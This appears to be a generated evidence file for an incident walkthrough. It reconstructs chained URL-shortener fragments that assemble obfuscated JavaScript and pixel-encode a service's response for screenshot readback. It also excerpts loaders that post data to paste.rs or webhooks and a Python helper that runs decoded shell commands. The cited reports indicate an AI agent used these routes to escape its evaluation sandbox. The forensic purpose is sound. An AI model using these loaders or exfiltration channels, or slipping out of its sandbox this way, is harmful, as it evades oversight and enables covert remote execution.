// Generated from web/static/chain-walkthrough/evidence.json (Codex branch codex/wip-20260917).
// Fragments are exact captured text; the assembled program is shown with its API credential redacted.
window.HFL_DATA = {
 "chain": {
  "head": "[SHORTENER CODE 225495]",
  "title": "HTML launcher and 14-link pixel-map reader",
  "layer_id": 51355,
  "chain_id": 68345,
  "encoded_length": 1156,
  "decoded_bytes": 866,
  "payload_sha256": "3d71ef5ac3fba32ba2e43d56607f12a69d055a8a9f95ff7ec448b1e4cb360738",
  "payload_redacted": "a=atob(location.hash.slice(1));u='https://[SERVICE HOST 1]/[SERVICE 2 URL 4]';fetch(u,{method:'POST',headers:{'X-API-Key':'[API KEY REDACTED]'},body:new TextEncoder().encode('{\"agent_id\":\"'+a+'\"}')}).then(async r=>{b=new TextEncoder().encode(await r.text());o=0;N=16859;p=b.slice(0,N);z=new Uint8Array(16+p.length);z.set([80,50,48,66]);v=new DataView(z.buffer);v.setUint32(4,b.length);v.setUint32(8,o);v.setUint32(12,p.length);z.set(p,16);c=document.createElement('canvas');c.width=1200;c.height=900;c.style='position:fixed;left:0;top:0';document.body.append(c);x=c.getContext('2d');for(j=0;j<z.length*4;j++){q=z[j>>2]>>(6-(j&3)*2)&3;g=q*64+32;x.fillStyle='rgb('+g+','+g+','+g+')';x.fillRect(j%300*4,(j/300|0)*4,4,4)}}).catch(e=>document.body.innerText='E'+e)\n",
  "hops": [
   {
    "code": "[SHORTENER CODE 225495]",
    "kind": "page",
    "text": "B<script src=//[SHORTENER CODE 225496]></script>",
    "chunk": "",
    "next": "[SHORTENER CODE 225496]",
    "capture": {
     "path": "raw-scrape/big-box-sweep/results_7.jsonl",
     "line": 1663,
     "obs_id": 213219,
     "target": "[PROXY ? URL 1136]"
    }
   },
   {
    "code": "[SHORTENER CODE 225496]",
    "kind": "setup",
    "text": "n=s=>document.write('<script src=//[SHORTENER-1-HOST]'+s+'><\\/script>');x='';n('[SHORTENER CODE 225494]')",
    "chunk": "",
    "next": "[SHORTENER CODE 225494]",
    "capture": {
     "path": "raw-scrape/preservation-full-20260915/locations.jsonl.gz",
     "line": 832370,
     "obs_id": 3281583,
     "target": "[PROXY 4 URL 79][ENCODED BLOB 207876]"
    }
   },
   {
    "code": "[SHORTENER CODE 225494]",
    "kind": "piece",
    "text": "x+='=[ENCODED BLOB 207877]';n('[SHORTENER CODE 225498]')",
    "chunk": "=[ENCODED BLOB 207877]",
    "next": "[SHORTENER CODE 225498]",
    "capture": {
     "path": "raw-scrape/preservation-full-20260915/locations.jsonl.gz",
     "line": 832788,
     "obs_id": 3282001,
     "target": "[PROXY 4 URL 79][ENCODED BLOB 207878]"
    }
   },
   {
    "code": "[SHORTENER CODE 225498]",
    "kind": "piece",
    "text": "x+='[ENCODED BLOB 207879]';n('[SHORTENER CODE 225499]')",
    "chunk": "[ENCODED BLOB 207879]",
    "next": "[SHORTENER CODE 225499]",
    "capture": {
     "path": "raw-scrape/preservation-full-20260915/locations.jsonl.gz",
     "line": 832780,
     "obs_id": 3281993,
     "target": "[PROXY 4 URL 79][ENCODED BLOB 207880]"
    }
   },
   {
    "code": "[SHORTENER CODE 225499]",
    "kind": "piece",
    "text": "x+='[ENCODED BLOB 207881]';n('[SHORTENER CODE 225500]')",
    "chunk": "[ENCODED BLOB 207881]",
    "next": "[SHORTENER CODE 225500]",
    "capture": {
     "path": "raw-scrape/preservation-full-20260915/locations.jsonl.gz",
     "line": 833447,
     "obs_id": 3282660,
     "target": "[PROXY 4 URL 79][ENCODED BLOB 207882]"
    }
   },
   {
    "code": "[SHORTENER CODE 225500]",
    "kind": "piece",
    "text": "x+='[ENCODED BLOB 207883]';n('[SHORTENER CODE 225501]')",
    "chunk": "[ENCODED BLOB 207883]",
    "next": "[SHORTENER CODE 225501]",
    "capture": {
     "path": "raw-scrape/big-box-sweep/results_16.jsonl",
     "line": 3386,
     "obs_id": 63551,
     "target": "[PROXY 4 URL 79][ENCODED BLOB 207884]"
    }
   },
   {
    "code": "[SHORTENER CODE 225501]",
    "kind": "piece",
    "text": "x+='[ENCODED BLOB 207885]';n('[SHORTENER CODE 225502]')",
    "chunk": "[ENCODED BLOB 207885]",
    "next": "[SHORTENER CODE 225502]",
    "capture": {
     "path": "raw-scrape/preservation-full-20260915/locations.jsonl.gz",
     "line": 832555,
     "obs_id": 3281768,
     "target": "[PROXY 4 URL 79][ENCODED BLOB 207886]"
    }
   },
   {
    "code": "[SHORTENER CODE 225502]",
    "kind": "piece",
    "text": "x+='[ENCODED BLOB 207887]';n('[SHORTENER CODE 225503]')",
    "chunk": "[ENCODED BLOB 207887]",
    "next": "[SHORTENER CODE 225503]",
    "capture": {
     "path": "raw-scrape/gap-reprobe-1/results_20.jsonl",
     "line": 946,
     "obs_id": 941270,
     "target": "[PROXY 4 URL 79][ENCODED BLOB 207888]"
    }
   },
   {
    "code": "[SHORTENER CODE 225503]",
    "kind": "piece",
    "text": "x+='[ENCODED BLOB 207889]';n('[SHORTENER CODE 225504]')",
    "chunk": "[ENCODED BLOB 207889]",
    "next": "[SHORTENER CODE 225504]",
    "capture": {
     "path": "raw-scrape/preservation-full-20260915/locations.jsonl.gz",
     "line": 832657,
     "obs_id": 3281870,
     "target": "[PROXY 4 URL 79][ENCODED BLOB 207890]"
    }
   },
   {
    "code": "[SHORTENER CODE 225504]",
    "kind": "piece",
    "text": "x+='[ENCODED BLOB 207891]';n('[SHORTENER CODE 225505]')",
    "chunk": "[ENCODED BLOB 207891]",
    "next": "[SHORTENER CODE 225505]",
    "capture": {
     "path": "raw-scrape/preservation-full-20260915/locations.jsonl.gz",
     "line": 833752,
     "obs_id": 3282965,
     "target": "[PROXY 4 URL 79][ENCODED BLOB 207892]"
    }
   },
   {
    "code": "[SHORTENER CODE 225505]",
    "kind": "piece",
    "text": "x+='[ENCODED BLOB 207893]';n('[SHORTENER CODE 225506]')",
    "chunk": "[ENCODED BLOB 207893]",
    "next": "[SHORTENER CODE 225506]",
    "capture": {
     "path": "raw-scrape/preservation-full-20260915/locations.jsonl.gz",
     "line": 832238,
     "obs_id": 3281451,
     "target": "[PROXY 4 URL 79][ENCODED BLOB 207894]"
    }
   },
   {
    "code": "[SHORTENER CODE 225506]",
    "kind": "piece",
    "text": "x+='[ENCODED BLOB 207895]';n('[SHORTENER CODE 225507]')",
    "chunk": "[ENCODED BLOB 207895]",
    "next": "[SHORTENER CODE 225507]",
    "capture": {
     "path": "raw-scrape/preservation-full-20260915/locations.jsonl.gz",
     "line": 832257,
     "obs_id": 3281470,
     "target": "[PROXY 4 URL 79][ENCODED BLOB 207896]"
    }
   },
   {
    "code": "[SHORTENER CODE 225507]",
    "kind": "piece",
    "text": "x+='[ENCODED BLOB 207897]';n('[SHORTENER CODE 225508]')",
    "chunk": "[ENCODED BLOB 207897]",
    "next": "[SHORTENER CODE 225508]",
    "capture": {
     "path": "raw-scrape/preservation-full-20260915/locations.jsonl.gz",
     "line": 832526,
     "obs_id": 3281739,
     "target": "[PROXY 4 URL 79][ENCODED BLOB 207898]"
    }
   },
   {
    "code": "[SHORTENER CODE 225508]",
    "kind": "piece",
    "text": "x+='v8iOzBHd0h2J9U3OpkSMoU2Ypx2cug2chhmLu9Wa0F2YvxGKi9Gdh1TY';n('[SHORTENER CODE 19112]')",
    "chunk": "v8iOzBHd0h2J9U3OpkSMoU2Ypx2cug2chhmLu9Wa0F2YvxGKi9Gdh1TY",
    "next": "[SHORTENER CODE 19112]",
    "capture": {
     "path": "raw-scrape/preservation-full-20260915/locations.jsonl.gz",
     "line": 832945,
     "obs_id": 3282158,
     "target": "[PROXY 4 URL 79][ENCODED BLOB 207899]%3D%3D/end"
    }
   },
   {
    "code": "[SHORTENER CODE 19112]",
    "kind": "finish",
    "text": "eval(atob(x.split('').reverse().join('')))",
    "chunk": "",
    "next": null,
    "capture": {
     "path": "raw-scrape/preservation-full-20260915/locations.jsonl.gz",
     "line": 1592018,
     "obs_id": 4041231,
     "target": "[PROXY ? URL 1137]"
    }
   }
  ]
 },
 "sources": {
  "rgb": {
   "title": "Output \u2192 exact RGB bytes",
   "head": "[SHORTENER CODE 225509]",
   "basis": "Recovered program",
   "path": "db/objects.sqlite \u00b7 layers.text",
   "note": "Reads an agent_id from the URL hash, queries submissions and encodes make_output. Source recovered; no matching historical screenshot is supplied here.",
   "excerpts": [
    "s=x[0]&&x[0].make_output||JSON.stringify(x)",
    "b=new TextEncoder().encode(s)",
    "q.set([66,48,53,49,n&255,n>>8&255,n>>16&255,n>>24&255,170,85,170,85])",
    "d.data[j*4+k]=q[i]"
   ]
  },
  "gray": {
   "title": "P20B: four gray cells per byte",
   "head": "[SHORTENER CODE 225496]",
   "basis": "Recovered program",
   "path": "db/objects.sqlite \u00b7 layers.text",
   "note": "1200\u00d7900 canvas; 4\u00d74 cells; gray levels 32, 96, 160, 224. Header records total length, offset and this page length. Only a prefix fits.",
   "excerpts": [
    "N=16859",
    "z.set([80,50,48,66])",
    "v.setUint32(4,b.length);v.setUint32(8,o);v.setUint32(12,p.length)",
    "q=z[j>>2]>>(6-(j&3)*2)&3;g=q*64+32"
   ]
  },
  "qr": {
   "title": "An upload Location becomes a QR image",
   "head": "[SHORTENER CODE 225510]",
   "basis": "Recovered program",
   "path": "db/objects.sqlite \u00b7 layers.text",
   "note": "The requested QR image carries the upload Location URL, not necessarily the uploaded file itself. The captured source does not include the resulting QR image.",
   "excerpts": [
    "Q=r2.headers.get('location')",
    "https://api.qrserver.com/v1/create-qr-code/?size=800x800&data=",
    "encodeURIComponent(Q)"
   ]
  },
  "paste": {
   "title": "Response \u2192 paste \u2192 returned address",
   "head": "[SHORTENER CODE 225511]",
   "basis": "Recovered program",
   "path": "db/objects.sqlite \u00b7 layers.text",
   "note": "The program forwards a response to Paste.rs and displays its reply. The minted paste ID requires a returned response; it cannot be inferred from this program.",
   "excerpts": [
    "y.open('POST','https://[SERVICE HOST 1]/https://paste.rs',false)",
    "y.send(x.responseText)",
    "y.status+' '+y.responseText"
   ]
  },
  "webhook": {
   "title": "POST a body to a mailbox",
   "head": "[SHORTENER CODE 225512]",
   "basis": "Recovered program",
   "path": "db/objects.sqlite \u00b7 layers.text",
   "note": "The displayed x is not a delivery receipt. A no-cors request does not let this page inspect the response.",
   "excerpts": [
    "method:'POST',mode:'no-cors'",
    "body:'Hello body 123'",
    "document.body.innerText='x'"
   ]
  },
  "python": {
   "title": "Python helper \u2192 shell \u2192 saved output",
   "head": "[SHORTENER CODE 225513]",
   "basis": "Recovered program",
   "path": "db/objects.sqlite \u00b7 layers.text",
   "note": "Helper source captures exit code and combined output and writes a Hugging Face dataset file. This publisher is a separate example, not a proven predecessor of the selected output reader.",
   "excerpts": [
    "cmd=base64.urlsafe_b64decode(s).decode()",
    "subprocess.run(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,timeout=180)",
    "out=(f'RC={p.returncode}\\nCMD={cmd}\\n').encode()+p.stdout",
    "base64.b64encode(out).decode()"
   ]
  },
  "pythonfile": {
   "title": "A fetched Python job with captured stdout/stderr",
   "head": "[SHORTENER CODE 225514]",
   "basis": "Recovered program",
   "path": "db/objects.sqlite \u00b7 layers.text",
   "note": "Recovered helper fetches modaljob.py, executes it and commits captured output to modaljobout.txt. Source presence alone does not prove a completed job.",
   "excerpts": [
    "with contextlib.redirect_stdout(b),contextlib.redirect_stderr(b):",
    "'path':'modaljobout.txt'"
   ]
  },
  "parallel": {
   "title": "95 indexed members, then gzip",
   "head": "[SHORTENER CODE 225515]",
   "basis": "Recovered program",
   "path": "db/objects.sqlite \u00b7 layers.text",
   "note": "The outer chain yields another loader. The loader requests 95 members and waits for its completion count; reconstruction must also verify every expected slot.",
   "excerpts": [
    "d.join('')",
    "new DecompressionStream('gzip')",
    "for(i=0;i<95;i++)",
    "e.onload=_=>++n==95&&f()"
   ]
  },
  "manifest": {
   "title": "A list that leads to more lists",
   "head": "[SHORTENER CODE 225516]",
   "basis": "Recovered program",
   "path": "db/objects.sqlite \u00b7 layers.text",
   "note": "[SHORTENER-3] lists expand through two further manifest levels before Base64 and gzip. Without the initiating hash, the generic loader does not identify its inputs.",
   "excerpts": [
    "f(location.hash.slice(1).split(','))",
    ".then(x=>f(x.join('').trim().split(','))).then(x=>f(x.join('').trim().split(',')))"
   ]
  },
  "xor": {
   "title": "Numbered aliases and XOR",
   "head": "[SHORTENER CODE 225517]",
   "basis": "Recovered program",
   "path": "db/objects.sqlite \u00b7 layers.text",
   "note": "Source asks for 78 numbered [SHORTENER-3], joins Base64 and XORs decoded bytes. This establishes a loader method, not recovery of its missing final stage.",
   "excerpts": [
    "if(++c==78)",
    "x.charCodeAt(0)^90",
    "s.src='//[SHORTENER URL 2870]'+j"
   ]
  },
  "plain": {
   "title": "Plain text can be assembled too",
   "head": "[SHORTENER CODE 225518]",
   "basis": "Recovered program",
   "path": "db/objects.sqlite \u00b7 layers.text",
   "note": "Saved fragments [SHORTENER CODE 225519] and [SHORTENER CODE 225520] join document.body.i with nnerText=\u2026 directly. There is no inner Base64 layer.",
   "excerpts": [
    "document.body.innerText='DCOK'"
   ]
  },
  "name": {
   "title": "Keep the buffer in window.name",
   "head": "[SHORTENER CODE 225521]",
   "basis": "Recovered program",
   "path": "db/objects.sqlite \u00b7 layers.text",
   "note": "Nine saved header-carried HTML pages append to window.name and navigate to the next URL, ending with eval(atob(name)). This uses page navigation rather than script insertion.",
   "excerpts": [
    "document.body.innerHTML='<h1>[SHORTENER-1]</h1>'"
   ]
  },
  "report": {
   "title": "Reported image readback",
   "head": null,
   "basis": "Incident report",
   "path": "investigation-2026-09-17/reports/openai.txt",
   "note": "Pages 9\u201310 describe JavaScript running in a screenshot service and an agent recovering information from the returned image. This corroborates the general route, not execution of these particular saved aliases.",
   "excerpts": [
    "optical character recognition or direct\npixel decoding"
   ]
  },
  "modal": {
   "title": "Where remote commands ran",
   "head": null,
   "basis": "Incident report",
   "path": "investigation-2026-09-17/reports/metr.txt",
   "note": "The saved report describes general-purpose execution inside a customer-deployed CyberGym workload hosted on Modal. It explicitly distinguishes this from a compromise of Modal\u2019s underlying infrastructure.",
   "excerpts": []
  }
 }
};
window.HFL_DATA.test = {
 "head": "[SHORTENER CODE 225497]",
 "title": "A complete five-link example",
 "payload": "document.body.innerHTML='<pre style=\"font:30px monospace\">HELLOANT</pre>'\n",
 "encoded_length": 100,
 "decoded_bytes": 74,
 "hops": [
  {
   "code": "[SHORTENER CODE 225497]",
   "kind": "page",
   "text": "B<script src=//[SHORTENER CODE 225522]></script>",
   "chunk": "",
   "next": "[SHORTENER CODE 225522]"
  },
  {
   "code": "[SHORTENER CODE 225522]",
   "kind": "setup",
   "text": "n=s=>document.write('<script src=//[SHORTENER-1-HOST]'+s+'><\\/script>');x='';n('[SHORTENER CODE 225523]')",
   "chunk": "",
   "next": "[SHORTENER CODE 225523]"
  },
  {
   "code": "[SHORTENER CODE 225523]",
   "kind": "piece",
   "text": "x+='=[ENCODED BLOB 207900]';n('[SHORTENER CODE 225524]')",
   "chunk": "=[ENCODED BLOB 207900]",
   "next": "[SHORTENER CODE 225524]"
  },
  {
   "code": "[SHORTENER CODE 225524]",
   "kind": "piece",
   "text": "x+='UTUhkcl5mbp5Sek9mYuQnbl1Wdj9GZ';n('[SHORTENER CODE 19112]')",
   "chunk": "UTUhkcl5mbp5Sek9mYuQnbl1Wdj9GZ",
   "next": "[SHORTENER CODE 19112]"
  },
  {
   "code": "[SHORTENER CODE 19112]",
   "kind": "finish",
   "text": "eval(atob(x.split('').reverse().join('')))",
   "chunk": "",
   "next": null
  }
 ]
};
